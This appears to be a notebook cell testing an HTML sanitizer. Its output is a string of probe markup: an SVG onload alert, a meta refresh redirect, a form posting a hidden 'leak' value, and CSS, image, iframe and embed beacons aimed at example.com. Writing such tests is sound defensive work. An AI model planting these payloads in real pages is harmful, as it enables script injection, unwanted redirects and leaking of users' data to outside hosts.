# %%
# Sanitizer test
# Out:
# <div id='control-text-r7k2'>CONTROL_PRESENT</div><a id='topnav-test' target='_top' href='https://example.com/topnav-r7k2'>CLICK_ME_TOP</a><a id='notop-test' href='https://example.com/notop-r7k2'>CLICK_NO_TOP</a><form id='form-test' action='https://example.com/form-r7k2' method='POST'><input type='hidden' name='leak' value='r7k2'><button>SUBMIT</button></form><meta http-equiv='refresh' content='0;url=https://example.com/meta-r7k2'><img id='absimg-test' src='https://example.com/absimg-r7k2.png'><style>body{background-image:url(https://example.com/cssleak-r7k2)}</style><iframe src='https://example.com/iframe-r7k2'></iframe><object data='https://example.com/object-r7k2'></object><embed src='https://example.com/embed-r7k2'><link rel='stylesheet' href='https://example.com/link-r7k2.css'><svg onload='alert(1)'><rect width='10' height='10'/></svg>
